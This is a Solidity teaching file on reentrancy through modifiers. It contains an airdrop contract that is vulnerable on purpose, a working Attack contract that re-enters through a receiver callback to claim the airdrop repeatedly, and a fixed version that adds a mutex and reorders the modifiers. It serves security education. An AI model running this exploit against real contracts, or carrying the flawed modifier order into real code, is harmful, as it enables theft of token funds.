// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;




interface IAirdropReceiver {
    function canReceiveAirdrop() external returns (bool);
}




contract InsecureAirdrop {
    mapping (address => uint256) private userBalances;
    mapping (address => bool) private receivedAirdrops;

    uint256 public immutable airdropAmount;

    constructor(uint256 _airdropAmount) {
        airdropAmount = _airdropAmount;
    }

    function receiveAirdrop() external neverReceiveAirdrop canReceiveAirdrop {
        // Mint Airdrop
        userBalances[msg.sender] += airdropAmount;
        receivedAirdrops[msg.sender] = true;
    }

    modifier neverReceiveAirdrop {
        require(!receivedAirdrops[msg.sender], "You already received an Airdrop");
        _;
    }

    // In this example, the _isContract() function is used for checking 
    // an airdrop compatibility only, not checking for any security aspects
    function _isContract(address _account) internal view returns (bool) {
        // It is unsafe to assume that an address for which this function returns 
        // false is an externally-owned account (EOA) and not a contract
        uint256 size;
        assembly {
            // There is a contract size check bypass issue
            // But, it is not the scope of this example though
            size := extcodesize(_account)
        }
        return size > 0;
    }

    modifier canReceiveAirdrop() {
        // If the caller is a smart contract, check if it can receive an airdrop
        if (_isContract(msg.sender)) {
            // In this example, the _isContract() function is used for checking 
            // an airdrop compatibility only, not checking for any security aspects
            require(
                IAirdropReceiver(msg.sender).canReceiveAirdrop(), 
                "Receiver cannot receive an airdrop"
            );
        }
        _;
    }

    function getUserBalance(address _user) external view returns (uint256) {
        return userBalances[_user];
    }

    function hasReceivedAirdrop(address _user) external view returns (bool) {
        return receivedAirdrops[_user];
    }
}






interface IAirdrop {
    function receiveAirdrop() external;
    function getUserBalance(address _user) external view returns (uint256);
}

contract Attack is IAirdropReceiver {
    IAirdrop public immutable airdrop;

    uint256 public xTimes;
    uint256 public xCount;

    constructor(IAirdrop _airdrop) {
        airdrop = _airdrop;
    }

    function canReceiveAirdrop() external override returns (bool) {
        if (xCount < xTimes) {
            xCount++;
            airdrop.receiveAirdrop();
        }
        return true;
    }

    function attack(uint256 _xTimes) external {
        xTimes = _xTimes;
        xCount = 1;

        airdrop.receiveAirdrop();
    }

    function getBalance() external view returns (uint256) {
        return airdrop.getUserBalance(address(this));
    }
}




abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract FixedAirdrop is ReentrancyGuard {
    mapping (address => uint256) private userBalances;
    mapping (address => bool) private receivedAirdrops;

    uint256 public immutable airdropAmount;

    constructor(uint256 _airdropAmount) {
        airdropAmount = _airdropAmount;
    }

    // FIX: 1. Apply mutex lock (noReentrant) as the first modifier
    // FIX: 2. Call canReceiveAirdrop before neverReceiveAirdrop
    function receiveAirdrop() external noReentrant canReceiveAirdrop neverReceiveAirdrop {
        // Mint Airdrop
        userBalances[msg.sender] += airdropAmount;
        receivedAirdrops[msg.sender] = true;
    }

    modifier neverReceiveAirdrop {
        require(!receivedAirdrops[msg.sender], "You already received an Airdrop");
        _;
    }

    // In this example, the _isContract() function is used for checking 
    // an airdrop compatibility only, not checking for any security aspects
    function _isContract(address _account) internal view returns (bool) {
        // It is unsafe to assume that an address for which this function returns 
        // false is an externally-owned account (EOA) and not a contract
        uint256 size;
        assembly {
            // There is a contract size check bypass issue
            // But, it is not the scope of this example though
            size := extcodesize(_account)
        }
        return size > 0;
    }

    modifier canReceiveAirdrop() {
        // If the caller is a smart contract, check if it can receive an airdrop
        if (_isContract(msg.sender)) {
            // In this example, the _isContract() function is used for checking 
            // an airdrop compatibility only, not checking for any security aspects
            require(
                IAirdropReceiver(msg.sender).canReceiveAirdrop(), 
                "Receiver cannot receive an airdrop"
            );
        }
        _;
    }

    function getUserBalance(address _user) external view returns (uint256) {
        return userBalances[_user];
    }

    function hasReceivedAirdrop(address _user) external view returns (bool) {
        return receivedAirdrops[_user];
    }
}